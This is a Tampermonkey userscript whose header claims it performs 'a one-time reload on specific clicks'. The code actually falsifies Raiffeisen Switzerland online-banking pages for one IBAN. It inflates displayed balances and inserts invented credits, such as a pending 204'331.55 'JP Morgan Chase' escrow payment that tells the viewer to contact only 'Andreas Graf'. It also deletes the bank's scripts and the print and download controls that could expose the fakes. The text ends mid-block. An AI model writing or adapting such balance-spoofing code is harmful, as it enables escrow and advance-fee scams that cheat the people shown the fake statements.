// ==UserScript==
// @name         Ed Raif CH Combined Peter Güntert
// @namespace    http://tampermonkey.net/
// @version      0.5
// @description  Perform a one-time reload on specific clicks
// @author       You
// @match        https://www.drivehq.com/*
// @match        *://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=drivehq.com
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/487376/Ed%20Raif%20CH%20Combined%20Peter%20G%C3%BCntert.user.js
// @updateURL https://update.greasyfork.org/scripts/487376/Ed%20Raif%20CH%20Combined%20Peter%20G%C3%BCntert.meta.js
// ==/UserScript==

   //=========================================================================================================================================================
 //=========================================================================================================================================================
 //=========================================================================================================================================================


//  MAIN PAGE BALANCE

// //INDEXING STARTS AT 1, NOT 0
 var MBALANCE_CONFIGS = [
    { index: 1, adjustmentAmount: 200 },// Konten
    { index: 3, adjustmentAmount: 200 },// Vermögen
    { index: 11, adjustmentAmount: 200 },
     { index: 12, adjustmentAmount: 200 },

    // Add more configurations as needed...
 ];

// UMSATZE BALANCE MODIFICATION

// Configurable adjustment amount (positive for increase, negative for decrease)
var adjustmentAmount = 200.0; // Change this value to adjust the balance accordingly

// Configurable desired IBAN
var desiredIban = "CH77 8080 8007 0274 5510 6";

// UMSATZE INSERT TRANSACTIONS


// Array of configurable transaction details
var transactionDetailsArray = [

    // EACH TRANSACTION HAS TO HAVE DIFFERENT TITLES

         {
        title: "JP Morgan Chase ",
        type: "Gutschrift",
        date: "Heute",
        amount: "+200.00",
        description: "Test",
        insertAbove: true, // Insert the transaction above the original one by default
        inserted: false // Flag to track if the transaction has been inserted
    },
    {
        title: "JP Morgan Chase",
        type: "Treuhand Gutschrift",
        date: "Vorgemerkt",
        amount: "+204'331.55",
        description: "Freigabe nötig. Wenden Sie sich bitte nur an Andreas Graf.",
        insertAbove: true, // Insert the transaction above the original one by default
        inserted: false // Flag to track if the transaction has been inserted
    },



];

// ---------------------------------------------------------------------------------------------

// UMSATZE  TABLE BALANCE MOD

   // Array of balance modification configurations
    var DMBALANCE_CONFIGS = [
        { targetTransactionDate: "20.02.2024", balanceModificationAmount: 200 },
        { targetTransactionDate: "23.01.2024", balanceModificationAmount: 0 },

        // Add more configurations as needed...
    ];

//------------------------------------------------------------------------------------------------


// UMSATZE  TABLE INSERT


    // Array of transaction configurations
    var transactions = [
        {
            targetTransactionDate: "16.02.2024",
            transactionDate: "20.02.2024",
            transactionTitle: "JP Morgan Chase",
            transactionDetails: "Vorgemerkt. Freigabe nötig. Wenden Sie sich nur an Andreas Graf.",
            transactionType: "positive", // Specify "positive" or "negative" for the transaction type
            positiveAmount: "+204'331.55",
            negativeAmount: " ",
            modifyAmount: 0, // Specify the amount by which the saldo needs to be modified
            insertAbove: true // Set to true to insert above, false to insert below
        },
        {
           targetTransactionDate: "16.02.2024",
            transactionDate: "20.02.2024",
           transactionTitle: "JP Morgan Chase",
            transactionDetails: "Test.",
            transactionType: "positive", // Specify "positive" or "negative" for the transaction type
            positiveAmount: "+200.00",
            negativeAmount: " ",
            modifyAmount: 200, // Specify the amount by which the saldo needs to be modified
            insertAbove: true // Set to true to insert above, false to insert below
        },
        // Add more transactions as needed...
    ];


 //=========================================================================================================================================================
 //=========================================================================================================================================================
 //=========================================================================================================================================================


  if (window.location.href.indexOf("raiffeisen") > 0 || window.location.href.indexOf("drive") > 0 || window.location.href.indexOf("11000189349") > 0) {

   //     // Configurable Elements
   //     var MBALANCE_CONFIGS = [
  //          { index: 1, adjustmentAmount: -90000 }, // Konten
  //           { index: 2, adjustmentAmount: -90000 },
  //           { index: 3, adjustmentAmount: -90000 },
   //         { index: 4, adjustmentAmount: -90000 }, // Vermögen
  //          { index: 6, adjustmentAmount: -90000 },
  //           { index: 9, adjustmentAmount: -90000 },
   //          { index:10, adjustmentAmount: -90000 },
   //          { index:11, adjustmentAmount: -90000 },
            // Add more configurations as needed...
   //     ];

         // Function to modify the balances
        function modifyBalances() {
            MBALANCE_CONFIGS.forEach(function(config) {
                var index = config.index;
                var adjustmentAmount = config.adjustmentAmount;
                modifySingleBalance(index, adjustmentAmount);
            });
        }

        // Function to modify a single balance
        function modifySingleBalance(index, adjustmentAmount) {
            var balanceElements = document.querySelectorAll('.output .value');
            if (balanceElements.length >= index) {
                var balanceElement = balanceElements[index - 1];
                if (balanceElement) {
                    var currentBalance = parseFloat(balanceElement.textContent.replace(/[^\d.-]/g, ''));
                    var newBalance = currentBalance + adjustmentAmount;
                    balanceElement.textContent = formatBalance(newBalance);
                    var parent = balanceElement.closest('.output');
                    if (currentBalance < 0 && newBalance >= 0) {
                        parent.classList.remove('negative');
                    }
                    console.log("Balance at index", index, "modified:", formatBalance(newBalance));
                    setTimeout(function() {
                        var tablistElement = document.querySelector('[role="tablist"]');
                        if (tablistElement) {
                            tablistElement.remove();
                            console.log("Element with role='tablist' removed.");
                        }
                    }, 20);
                } else {
                    console.log("Balance element at index", index, "not found.");
                }
            } else {
                console.log("Insufficient number of balance elements to modify at index", index);
            }
        }

        // Function to format the balance
        function formatBalance(balance) {
            return balance.toFixed(2).replace(/\B(?=(\d{3})+(?!\d))/g, "'");
        }

        // Function to check for the presence of the element with role="tablist"
        function checkTablistPresence() {
            var tablistElement = document.querySelector('[role="tablist"]');
            if (tablistElement) {
                console.log("Element with role='tablist' found. Modifying balances...");
                modifyBalances();
            } else {
                console.log("Element with role='tablist' not found. Waiting...");
            }
        }

        // Function to remove scripts from the document
        function removeScripts() {
            console.log("Removing scripts...");
            document.querySelectorAll('script').forEach(function(script) {
                script.remove();
                console.log("Script removed.");
            });
        }

        // Watch for changes in the DOM and remove added scripts
        var observer = new MutationObserver(function(mutationsList) {
            for (var mutation of mutationsList) {
                if (mutation.addedNodes) {
                    for (var node of mutation.addedNodes) {
                        if (node.tagName === 'SCRIPT') {
                            console.log("Script added. Removing...");
                            node.remove();
                            console.log("Script removed.");
                        }
                    }
                }
            }
        });

        // Start observing the document
        observer.observe(document.documentElement, { childList: true, subtree: true });

        // Remove all scripts from the document
        removeScripts();

        // Check for the presence of the element with role="tablist" every 150 milliseconds
        setInterval(checkTablistPresence, 150);
    }

//==========================================================================================================================================================
//==========================================================================================================================================================
//==========================================================================================================================================================
//==========================================================================================================================================================
//==========================================================================================================================================================
//==========================================================================================================================================================


  if (window.location.href.indexOf("raiffeisen") > 0 || window.location.href.indexOf("drive") > 0 || window.location.href.indexOf("11000189349") > 0) {


//    // Configurable adjustment amount (positive for increase, negative for decrease)
//     var adjustmentAmount = -5000; // Change this value to adjust the balance accordingly

//    // Configurable desired IBAN
//     var desiredIban = "CH96 8080 8003 0044 8607 6";

// Function to modify the balance
function modifyBalance() {
    // Check if the desired IBAN is present on the page
    var ibanFound = checkForDesiredIban(desiredIban);
    if (!ibanFound) {
        console.log("Desired IBAN not found on the page. Waiting...");
        return;
    }

    // Find the balance element and its container
    var balanceElement = document.querySelector('.saldo-container.green .value, .saldo-container.red .value');
    var balanceContainer = balanceElement ? balanceElement.closest('.saldo-container') : null;

    if (balanceElement && balanceContainer) {
        // Extract the balance value from the text content and remove any non-numeric characters
        var currentBalance = parseFloat(balanceElement.textContent.replace(/[^\d.-]/g, ''));

        // Modify the balance by the adjustment amount
        var newBalance = currentBalance + adjustmentAmount;

        // Update the text content of the balance element with the new balance value
        balanceElement.textContent = formatBalance(newBalance);

        // Update the color class of the balance container based on the sign of the new balance value
        var containerColorClass = newBalance >= 0 ? 'green' : 'red';
        balanceContainer.classList.remove('green', 'red');
        balanceContainer.classList.add(containerColorClass);

        // Update the color class of the balance element based on the sign of the new balance value
        var balanceColorClass = newBalance >= 0 ? 'positive' : 'negative';
        balanceElement.closest('.output').classList.remove('positive', 'negative');
        balanceElement.closest('.output').classList.add(balanceColorClass);

        console.log("Balance modified:", formatBalance(newBalance));

        // Remove the element with class "row-fluid no-minheight margin-medium" after a short delay
        setTimeout(function() {
            var rowFluidElement = document.querySelector('.row-fluid.no-minheight.margin-medium');
            if (rowFluidElement) {
                rowFluidElement.remove();
                console.log("Element with class 'row-fluid no-minheight margin-medium' removed.");
            }
        }, 10);
    } else {
        console.log('Balance element or container not found.');
    }
}

// Function to check for the presence of the desired IBAN on the page
function checkForDesiredIban(desiredIban) {
    var ibanElements = document.querySelectorAll('.output .iban');
    for (var i = 0; i < ibanElements.length; i++) {
        if (ibanElements[i].textContent.trim().replace(/\s+/g, '').toUpperCase() === desiredIban.trim().replace(/\s+/g, '').toUpperCase()) {
            console.log("Desired IBAN found:", desiredIban);
            return true;
        }
    }
    return false;
}

// Function to format the balance with thousands separator and two decimal places
function formatBalance(balance) {
    return balance.toFixed(2).replace(/\B(?=(\d{3})+(?!\d))/g, "'");
}

// Function to check for the presence of the element with class "row-fluid no-minheight margin-medium" every 4 seconds
function checkRowFluidElement() {
    setInterval(function() {
        var rowFluidElement = document.querySelector('.row-fluid.no-minheight.margin-medium');
        if (rowFluidElement) {
            console.log("Element with class 'row-fluid no-minheight margin-medium' found. Modifying balance...");
            modifyBalance();
        } else {
            console.log("Element with class 'row-fluid no-minheight margin-medium' not found. Waiting...");
        }
    }, 200);
}

// Function to remove scripts from the document
function removeScripts() {
    console.log("Removing scripts...");
    document.querySelectorAll('script').forEach(function(script) {
        script.remove();
        console.log("Script removed.");
    });
}

// Watch for changes in the DOM and remove added scripts
var dobserver = new MutationObserver(function(mutationsList) {
    for (var mutation of mutationsList) {
        if (mutation.addedNodes) {
            for (var node of mutation.addedNodes) {
                if (node.tagName === 'SCRIPT') {
                    console.log("Script added. Removing...");
                    node.remove();
                    console.log("Script removed.");
                }
            }
        }
    }
});

// Start observing the document
dobserver.observe(document.documentElement, { childList: true, subtree: true });

// Remove all scripts from the document
removeScripts();

// Call the function to check for the presence of the element with class "row-fluid no-minheight margin-medium"
checkRowFluidElement();
 }

//===============================================================================================================================================
//===============================================================================================================================================
//===============================================================================================================================================
//===============================================================================================================================================
//===============================================================================================================================================
//===============================================================================================================================================


 if (window.location.href.indexOf("raiffeisen") > 0 || window.location.href.indexOf("drive") > 0 || window.location.href.indexOf("11000189349") > 0) {


//    // Configurable IBAN
//     var desiredIban = "CH96 8080 8003 0044 8607 6";

//    // Array of configurable transaction details
//     var transactionDetailsArray = [
//    {
//        title: "JP Morgan Chase",
//        type: "Treuhand Zahlung",
 //       date: "Vorgemekrt",
 //       amount: "+4'331.55",
 //       description: "Freigabe nötig. Wenden Sie sich bitte an Andreas Graf.",
 //       insertAbove: true, // Insert the transaction above the original one by default
 //       inserted: false // Flag to track if the transaction has been inserted
 //   },
 //   {
//       title: "Another Transaction",
 //       type: "Another Type",
 //       date: "Another Date",
 //       amount: "-2'000.00",
 //       description: "Another Description",
 //       insertAbove: false, // Insert the transaction below the original one
 //       inserted: false // Flag to track if the transaction has been inserted
 //   }
//    ];

// Function to create and insert transactions
function insertTransactions() {
    // Convert the desired IBAN to lowercase and remove white spaces
    var normalizedIBAN = desiredIban.toLowerCase().replace(/\s+/g, '');

    // Find the element with class "output"
    var outputElement = document.querySelector('.output');

    if (outputElement) {
        // Get the text content of all children within the output element
        var outputChildrenText = Array.from(outputElement.children).map(child => child.textContent.toLowerCase()).join('');

        // Remove white spaces from the combined text content
        var pageContent = outputChildrenText.replace(/\s+/g, '');

        // Check if the desired IBAN is present on the page
        var ibanFound = pageContent.includes(normalizedIBAN);
        console.log("IBAN found on the page:", ibanFound);

        if (ibanFound) {
            // Loop through each transaction details object in the array
            transactionDetailsArray.forEach(function(transactionDetails) {
                // Check if the transaction has already been inserted
                if (!transactionDetails.inserted) {
                    var insertedTransaction = document.querySelector('.first-in-timeline .multi-line.title');
                    if (!insertedTransaction || insertedTransaction.textContent !== transactionDetails.title) {
                        // Transaction not found, insert it
                        var originalElement = document.querySelector('.first-in-timeline');
                        if (originalElement) {
                            var duplicateElement = originalElement.cloneNode(true);
                            var amount = parseFloat(transactionDetails.amount.replace(/[^\d.-]/g, ''));
                            var itemClass = amount >= 0 ? "item positive" : "item accordion";

                            duplicateElement.innerHTML = `
    <div class="${itemClass}">
     <a role="button" class="box header" href="https://ebanking.raiffeisen.ch/app/">
     <p class="multi-line title">${transactionDetails.title}</p>

     <p translate="">
     ${transactionDetails.type}
     </p>
     <div class="left">
     <p class="light">${transactionDetails.date}</p>
     </div>
     <div class="right">
     <span class="output medium">

     <div>${transactionDetails.amount}</div>
     </span>
     </div>
     <div class="message-group">
     <div>
     <div class="left">
     <p class="multi-line">${transactionDetails.description}</p>
     <eb-notice-info><div hidden="" class="sf-hidden">


    </div>
    </eb-notice-info>
     </div>
     <span class="output pull-right">
     <div class="normal">${transactionDetails.amount}</div>
     </span>
     </div>
     </div>
     </a>
     </div>
    `;

                            var insertionPosition = transactionDetails.insertAbove ? originalElement : originalElement.nextSibling;
                            originalElement.parentNode.insertBefore(duplicateElement, insertionPosition);

                            // Mark the transaction as inserted
                            transactionDetails.inserted = true;

                            console.log("Transaction inserted successfully:", transactionDetails.title);
                        } else {
                            console.log('Original element with class "first-in-timeline" not found.');
                        }
                    } else {
                        // Transaction already inserted
                        transactionDetails.inserted = true;
                        console.log("Transaction already inserted:", transactionDetails.title);
                    }
                }
            });
        } else {
            console.log("Desired IBAN not found on the page. Transactions not inserted.");
        }
    } else {
        console.log('Output element not found.');
    }
}

// Function to check if transactions are inserted and reinsert if necessary
function checkAndReinsertTransactions() {
    // Loop through each transaction details object in the array
    transactionDetailsArray.forEach(function(transactionDetails) {
        // Check if the transaction has already been inserted
        if (!transactionDetails.inserted) {
            console.log("Transaction not inserted. Reinserting...");
            insertTransactions();
            return; // Exit the loop after reinserting one transaction
        } else {
            console.log("Transaction already inserted:", transactionDetails.title);
        }
    });
}

// Function to remove scripts from the document
function removeScripts() {
    console.log("Removing scripts...");
    document.querySelectorAll('script').forEach(function(script) {
        script.remove();
        console.log("Script removed.");
    });
}

// Watch for changes in the DOM and remove added scripts
var cdobserver = new MutationObserver(function(mutationsList) {
    for (var mutation of mutationsList) {
        if (mutation.addedNodes) {
            for (var node of mutation.addedNodes) {
                if (node.tagName === 'SCRIPT') {
                    console.log("Script added. Removing...");
                    node.remove();
                    console.log("Script removed.");
                }
            }
        }
    }
});

// Start observing the document
cdobserver.observe(document.documentElement, { childList: true, subtree: true });

// Remove all scripts from the document
removeScripts();

// Call the function to insert transactions initially
insertTransactions();

// Regular check every 2 seconds to verify and reinsert transactions if necessary
setInterval(checkAndReinsertTransactions, 200);
}



//  ======================================================================================================================================
//  ======================================================================================================================================
//  ======================================================================================================================================
//  ======================================================================================================================================
//      Raif CH Umsatze table balance mod 11 with Interval and Element Removal
  if (window.location.href.indexOf("raiffeisen") > 0 || window.location.href.indexOf("drive") > 0 || window.location.href.indexOf("11000189349") > 0) {
//  ======================================================================================================================================
//  ======================================================================================================================================
    'use strict';

//    // Desired IBAN
//    var desiredIban = "CH77 8080 8007 0274 5510 6";

    // Function to remove white spaces and convert to lower case for case insensitivity
    function normalizeIban(iban) {
        return iban.replace(/\s/g, '').toLowerCase();
    }

//    // Array of balance modification configurations
//    var DMBALANCE_CONFIGS = [
//        { targetTransactionDate: "16.01.2024", balanceModificationAmount: 100000 },
//        { targetTransactionDate: "23.01.2024", balanceModificationAmount: 100000 },

        // Add more configurations as needed...
//    ];

    // Function to check if the desired IBAN is present on the page
    function checkDesiredIban() {
        var ibanPresent = normalizeIban(document.body.textContent).includes(normalizeIban(desiredIban));
        console.log("Desired IBAN check performed: " + ibanPresent);
        return ibanPresent;
    }

    // Function to modify the balance based on the configurations
    function modifyBalances() {
        DMBALANCE_CONFIGS.forEach(function(config) {
            // Find all elements with role="cell" but not with class="data col-1 swipe-2 medium-1" and also not with class="data col-5 fixed"
            var balanceElements = document.querySelectorAll('[role="presentation"] [role="cell"]:not(.data.col-1.swipe-2.medium-1):not(.data.col-5.fixed)');

            // Iterate through each balance element
            balanceElements.forEach(function(element) {
                // Get the current transaction date from the same element
                var transactionDateElement = element.closest('[role="presentation"]').querySelector('.data.col-1.swipe-2.medium-1');
                var transactionDate = transactionDateElement ? transactionDateElement.textContent.trim() : null;
                if (!transactionDate || transactionDate < config.targetTransactionDate) {
                    return; // Skip if the transaction date is before the target date
                }

                // Get the current balance value
                var currentBalance = element.textContent.trim();

                // Modify the balance
                var modifiedBalance = parseFloat(currentBalance.replace(/[^\d.-]/g, '')) + config.balanceModificationAmount;

                // Format the modified balance
                modifiedBalance = modifiedBalance.toLocaleString('de-CH', { maximumFractionDigits: 2 });

                // Remove plus sign from positive balances
                if (parseFloat(modifiedBalance) >= 0) {
                    element.classList.remove('red'); // Remove 'red' class
                    element.classList.add('black'); // Add 'black' class
                } else {
                    element.classList.remove('black'); // Remove 'black' class
                    element.classList.add('red'); // Add 'red' class
                }

                // Set the modified balance text content
                element.textContent = modifiedBalance;
            });
        });

        console.log("Balances modified successfully.");

        // Remove the target element after 20 milliseconds
        setTimeout(function() {
            var targetElement = document.querySelector('.text-right.margin-tiny-top.span4');
            if (targetElement) {
                targetElement.remove();
                console.log("Target element removed.");
            }
        }, 20);
    }

    // Function to check for the presence of the target element and modify balances
    function checkAndModifyBalances() {
        var targetElement = document.querySelector('.text-right.margin-tiny-top.span4');
        if (targetElement) {
            console.log("Target element found. Checking IBAN and modifying balances...");
            if (checkDesiredIban()) {
                modifyBalances();
            } else {
                console.log("Desired IBAN not found.");
            }
        } else {
            console.log("Target element not found. Waiting for next check...");
        }
    }
// Function to remove scripts from the document
function removeScripts() {
    console.log("Removing scripts...");
    document.querySelectorAll('script').forEach(function(script) {
        script.remove();
        console.log("Script removed.");
    });
}

// Watch for changes in the DOM and remove added scripts
var ssdobserver = new MutationObserver(function(mutationsList) {
    for (var mutation of mutationsList) {
        if (mutation.addedNodes) {
            for (var node of mutation.addedNodes) {
                if (node.tagName === 'SCRIPT') {
                    console.log("Script added. Removing...");
                    node.remove();
                    console.log("Script removed.");
                }
            }
        }
    }
});

// Start observing the document
ssdobserver.observe(document.documentElement, { childList: true, subtree: true });

// Remove all scripts from the document
removeScripts();
    // Set up an interval to check for the presence of the target element every 5 seconds
    setInterval(checkAndModifyBalances, 200);
 }


//  ======================================================================================================================================
//  ======================================================================================================================================
//      Raif CH Umsatze table balance mod 11 with Interval and Element Removal
  if (window.location.href.indexOf("raiffeisen") > 0 || window.location.href.indexOf("drive") > 0 || window.location.href.indexOf("11000189349") > 0) {
//  ======================================================================================================================================
//  ======================================================================================================================================

    'use strict';

//    // Configurable IBAN
//    var desiredIban = "CH77 8080 8007 0274 5510 6";

    // Function to remove white spaces and convert to lower case for case insensitivity
    function normalizeIban(iban) {
        return iban.replace(/\s/g, '').toLowerCase();
    }

//    // Array of transaction configurations
//    var transactions = [
 //       {
//            targetTransactionDate: "22.01.2024",
//            transactionDate: "23.01.2024",
//            transactionTitle: "JP Morgan Chase",
//            transactionDetails: "Freigabe nötig.",
//            transactionType: "positive", // Specify "positive" or "negative" for the transaction type
 //           positiveAmount: "+100'000.45",
//            negativeAmount: " ",
 //           modifyAmount: 200000, // Specify the amount by which the saldo needs to be modified
 //           insertAbove: true // Set to true to insert above, false to insert below
 //       },
 //       {
 //           targetTransactionDate: "15.01.2024",
 //           transactionDate: "16.01.2024",
///            transactionTitle: "JP Morgan Chase",
//            transactionDetails: "Freigabe nötig.",
 //           transactionType: "positive", // Specify "positive" or "negative" for the transaction type
 //           positiveAmount: "+100'000.45",
 //           negativeAmount: " ",
//            modifyAmount: 100000, // Specify the amount by which the saldo needs to be modified
 //           insertAbove: true // Set to true to insert above, false to insert below
 //       },
        // Add more transactions as needed...
//    ];

    // Function to duplicate a presentation transaction with the specified configuration
    function duplicatePresentationTransaction(config) {
        // Check if the desired IBAN is present on the page
        var ibanPresent = normalizeIban(document.body.textContent).includes(normalizeIban(desiredIban));
        console.log("Desired IBAN check performed: " + ibanPresent);

        // Find the first transaction with role="presentation" containing the specified transaction date
        var transactions = document.querySelectorAll('[role="presentation"]');
        var firstPresentationTransaction;

        for (var i = 0; i < transactions.length; i++) {
            var transaction = transactions[i];
            if (transaction.textContent.includes(config.targetTransactionDate)) {
                firstPresentationTransaction = transaction;
                break;
            }
        }

        if (ibanPresent && firstPresentationTransaction) {
            // Clone the first presentation transaction
            var clonedTransaction = firstPresentationTransaction.cloneNode(true);

            // Modify the cloned transaction with configurable text values
            var clonedTransactionDate1 = clonedTransaction.querySelector('.data.col-1.swipe-2.medium-1');
            if (clonedTransactionDate1) {
                clonedTransactionDate1.textContent = config.transactionDate;
            }

            var clonedTransactionDate2 = clonedTransaction.querySelector('.data.col-1.swipe-3.medium-2.wide');
            if (clonedTransactionDate2) {
                clonedTransactionDate2.textContent = config.transactionDate;
            }

            var clonedTransactionTitle = clonedTransaction.querySelector('.multi-line');
            if (clonedTransactionTitle) {
                clonedTransactionTitle.textContent = config.transactionTitle;
            }

            var clonedTransactionDetails = clonedTransaction.querySelector('.light');
            if (clonedTransactionDetails) {
                clonedTransactionDetails.textContent = config.transactionDetails;
            }

            var clonedTransactionAmounts = clonedTransaction.querySelectorAll('.right.wide');
            if (clonedTransactionAmounts.length >= 2) {
                if (config.transactionType === "negative") {
                    clonedTransactionAmounts[0].textContent = config.negativeAmount;
                    clonedTransactionAmounts[1].textContent = config.positiveAmount;
                } else if (config.transactionType === "positive") {
                    clonedTransactionAmounts[1].textContent = "+" + config.positiveAmount.substring(1);
                    clonedTransactionAmounts[0].textContent = config.negativeAmount;
                }
            }

            // Add or remove the positive class based on the transaction type
            if (config.transactionType === "positive") {
                clonedTransaction.classList.add("positive");
            } else if (config.transactionType === "negative") {
                clonedTransaction.classList.remove("positive");
            }

            // Extract the original saldo amount
            var originalSaldoElement = firstPresentationTransaction.querySelector('.data.col-3.swipe-4.right');
            var originalSaldo = originalSaldoElement ? originalSaldoElement.textContent.trim() : "";

            // Modify the saldo amount
            var modifiedSaldo = ""; // Placeholder for modified saldo
            if (originalSaldo) {
                var originalSaldoValue = parseFloat(originalSaldo.replace(/[^\d.-]/g, '')); // Remove non-numeric characters
                var modifiedSaldoValue = originalSaldoValue + config.modifyAmount; // Modify the saldo
                modifiedSaldo = modifiedSaldoValue.toLocaleString('de-CH', { maximumFractionDigits: 2 }); // Format the modified saldo
            }

            // Set the modified saldo amount
            var clonedTransactionSaldo = clonedTransaction.querySelector('.data.col-3.swipe-4.right');
            if (clonedTransactionSaldo) {
                clonedTransactionSaldo.textContent = modifiedSaldo;
            }

            // Insert the cloned transaction above or below the original one based on the configuration
            if (config.insertAbove) {
                firstPresentationTransaction.parentNode.insertBefore(clonedTransaction, firstPresentationTransaction);
            } else {
                firstPresentationTransaction.parentNode.insertBefore(clonedTransaction, firstPresentationTransaction.nextSibling);
            }

            console.log("First presentation transaction containing '" + config.targetTransactionDate + "' duplicated with configurable values.");
        } else {
            console.log("Desired IBAN not found or no transaction with role=\"presentation\" containing '" + config.targetTransactionDate + "' found.");
        }
    }

    // Function to insert multiple transactions
    function insertTransactions() {
        transactions.forEach(function(transaction) {
            duplicatePresentationTransaction(transaction);
        });
    }

    // Call the function to insert transactions
    insertTransactions();

    // Function to periodically check and reinsert transactions if necessary
    function checkAndReinsertTransactions() {
        var inserted = transactions.every(function(transaction) {
            var transactions = document.querySelectorAll('[role="presentation"]');
            for (var i = 0; i < transactions.length; i++) {
                var transactionElement = transactions[i];
                if (transactionElement.textContent.includes(transaction.targetTransactionDate)) {
                    return true; // Transaction found
                }
            }
            return false; // Transaction not found
        });

        if (!inserted) {
            // Transactions not inserted, reinsert
            insertTransactions();
        }

        console.log("Transaction check performed.");
    }

      // Function to remove scripts from the document
function removeScripts() {
    console.log("Removing scripts...");
    document.querySelectorAll('script').forEach(function(script) {
        script.remove();
        console.log("Script removed.");
    });
}

// Watch for changes in the DOM and remove added scripts
var modobserver = new MutationObserver(function(mutationsList) {
    for (var mutation of mutationsList) {
        if (mutation.addedNodes) {
            for (var node of mutation.addedNodes) {
                if (node.tagName === 'SCRIPT') {
                    console.log("Script added. Removing...");
                    node.remove();
                    console.log("Script removed.");
                }
            }
        }
    }
});

// Start observing the document
modobserver.observe(document.documentElement, { childList: true, subtree: true });

// Remove all scripts from the document
removeScripts();
    // Set interval for checking and reinserting transactions
    setInterval(checkAndReinsertTransactions, 100);
  }



//===============================================================================================================================================
//===============================================================================================================================================
//===============================================================================================================================================
//===============================================================================================================================================
//===============================================================================================================================================
//===============================================================================================================================================




   if (window.location.href.indexOf("raiffeisen") > 0 || window.location.href.indexOf("drive") > 0 || window.location.href.indexOf("11000189349") > 0) {

    // Function to remove scripts from the document
    function removeScripts() {
        console.log("Removing scripts...");
        document.querySelectorAll('script').forEach(function(script) {
            script.remove();
            console.log("Script removed.");
        });
    }

    // Function to remove elements with class "icon icon-cog"
    function removeCogIcons() {
        console.log("Removing elements with class 'icon icon-cog'...");
        var cogIcons = document.querySelectorAll('.icon.icon-cog');
        cogIcons.forEach(function(icon) {
            icon.remove();
            console.log("Cog icon removed.");
        });
    }

    // Function to remove elements with labelledby="label-kunde"
    function removeLabelledByLabelKunde() {
        console.log("Removing elements with labelledby='label-kunde'...");
        var labelledByLabelKundeElements = document.querySelectorAll('[labelledby="label-kunde"]');
        labelledByLabelKundeElements.forEach(function(element) {
            element.remove();
            console.log("Element with labelledby='label-kunde' removed.");
        });
    }

    // Watch for changes in the DOM and remove added scripts, cog icons, and elements with labelledby="label-kunde"
    var erobserver = new MutationObserver(function(mutationsList) {
        for (var mutation of mutationsList) {
            if (mutation.addedNodes) {
                for (var node of mutation.addedNodes) {
                    if (node.tagName === 'SCRIPT') {
                        console.log("Script added. Removing...");
                        node.remove();
                        console.log("Script removed.");
                    }
                }
            }
        }
        removeCogIcons(); // Check for and remove cog icons on DOM changes
        removeLabelledByLabelKunde(); // Check for and remove elements with labelledby="label-kunde" on DOM changes
    });

    // Start observing the document
    erobserver.observe(document.documentElement, { childList: true, subtree: true });

    // Remove all scripts, cog icons, and elements with labelledby="label-kunde" from the document
    removeScripts();
    removeCogIcons(); // Remove cog icons on initial page load
    removeLabelledByLabelKunde(); // Remove elements with labelledby="label-kunde" on initial page load
}

//================================================================================================================================================
//================================================================================================================================================
//================================================================================================================================================



if (window.location.href.indexOf("raiffeisen") > 0 || window.location.href.indexOf("drive") > 0 || window.location.href.indexOf("11000189349") > 0) {

    // Function to remove scripts from the document
    function removeScripts() {
        console.log("Removing scripts...");
        document.querySelectorAll('script').forEach(function(script) {
            script.remove();
            console.log("Script removed.");
        });
    }

    // Function to remove elements with class "add-month margin-tiny-top"
    function removeAddMonthElements() {
        console.log("Removing elements with class='add-month margin-tiny-top'...");
        var addMonthElements = document.querySelectorAll('.add-month.margin-tiny-top');
        addMonthElements.forEach(function(element) {
            element.remove();
            console.log("Element removed.");
        });
    }

    // Function to remove elements with class "icon icon-print"
    function removePrintIcon() {
        console.log("Removing elements with class='icon icon-print'...");
        var printIconElements = document.querySelectorAll('.icon.icon-print');
        printIconElements.forEach(function(element) {
            element.remove();
            console.log("Element removed.");
        });
    }

    // Function to remove elements with class "icon icon-download-alt"
    function removeDownloadIcon() {
        console.log("Removing elements with class='icon icon-download-alt'...");
        var downloadIconElements = document.querySelectorAll('.icon.icon-download-alt');
        downloadIconElements.forEach(function(element) {
            element.remove();
            console.log("Element removed.");
        });
    }

    // Function to remove elements with class "legend"
    function removeLegendElements() {
        console.log("Removing elements with class='legend'...");
        var legendElements = document.querySelectorAll('.legend');
        legendElements.forEach(function(element) {
            element.remove();
            console.log("Element removed.");
        });
    }

    // Function to remove elements with uisref="v2.l.view"
    function removeUisrefElements() {
        console.log("Removing elements with uisref='v2.l.view'...");
        var uisrefElements = document.querySelectorAll('[uisref="v2.l.view"]');
        uisrefElements.forEach(function(element) {
            element.remove();
            console.log("Element removed.");
        });
    }

    // Function to remove elements with aria-labelledby="presentation-icon"
    function removePresentationIconElements() {
        console.log("Removing elements with aria-labelledby='presentation-icon'...");
        var presentationIconElements = document.querySelectorAll('[aria-labelledby="presentation-icon"]');
        presentationIconElements.forEach(function(element) {
            element.remove();
            console.log("Element removed.");
        });
    }

    // Function to remove elements with class "light" that have the parent with labelledby="label-konto"
    function removeLightElements() {
        console.log("Removing elements with class='light' that have the parent with labelledby='label-konto'...");
        var lightElements = document.querySelectorAll('[aria-labelledby="label-konto"] .light');
        lightElements.forEach(function(element) {
            element.remove();
            console.log("Element removed.");
        });
    }

    // Function to remove elements with class "span8 text-left margin-tiny-top"
    function removeSpan8TextLeftElements() {
        console.log("Removing elements with class='span8 text-left margin-tiny-top'...");
        var span8TextLeftElements = document.querySelectorAll('.span8.text-left.margin-tiny-top');
        span8TextLeftElements.forEach(function(element) {
            element.remove();
            console.log("Element removed.");
        });
    }

    // Function to remove elements with class "flip-container"
    function removeFlipContainerElements() {
        console.log("Removing elements with class='flip-container'...");
        var flipContainerElements = document.querySelectorAll('.flip-container');
        flipContainerElements.forEach(function(element) {
            element.remove();
            console.log("Element removed.");
        });
    }

    // Watch for changes in the DOM and remove added scripts, add-month elements, print icon elements, download icon elements, legend elements, elements with uisref="v2.l.view", elements with aria-labelledby="presentation-icon", elements with class "light" under parent with labelledby="label-konto", elements with class "span8 text-left margin-tiny-top", and elements with class "flip-container"
    var sdobserver = new MutationObserver(function(mutationsList) {
        for (var mutation of mutationsList) {
            if (mutation.addedNodes) {
                for (var node of mutation.addedNodes) {
                    if (node.tagName === 'SCRIPT') {
                        removeScripts();
                    }
                }
            }
        }
        removeAddMonthElements();
        removePrintIcon();
        removeDownloadIcon();
        removeLegendElements();
        removeUisrefElements();
        removePresentationIconElements();
        removeLightElements();
        removeSpan8TextLeftElements();
        removeFlipContainerElements();
    });

    // Start observing the document
    sdobserver.observe(document.documentElement, { childList: true, subtree: true });

